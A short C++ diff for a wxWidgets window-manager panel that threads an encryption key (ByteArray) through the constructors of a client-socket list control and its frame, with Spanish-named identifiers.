@@ -8,14 +8,15 @@ class ListWmManager : public wxListCtrl {
 	public:
 
 		ListWmManager(wxWindow* parent, const wxWindowID id,
-			const wxPoint& pos, const wxSize& size, long style)
-			: wxListCtrl(parent, id, pos, size, style) {}
+			const wxPoint& pos, const wxSize& size, long style, ByteArray c_key)
+			: wxListCtrl(parent, id, pos, size, style), enc_key(c_key) {}
 
 		SOCKET sckCliente = INVALID_SOCKET;
 
 		void AgregarData(const std::string& strBuffer);
 	private:
 
+		ByteArray enc_key;
 		void OnWMmessage(wxCommandEvent& event);
 
 		void ShowContextMenu(const wxPoint& pos, bool isEmpty);
@@ -27,10 +28,11 @@ class ListWmManager : public wxListCtrl {
 
 class panelWManager : public wxFrame {
 	public:
-		panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string strID);
+		panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string strID, ByteArray c_key);
 
 		void AgregarData(const std::string& strBuffer);
 	private:
+		ByteArray enc_key;
 		ListWmManager* listManager = nullptr;
 
 		void m_CrearListView();
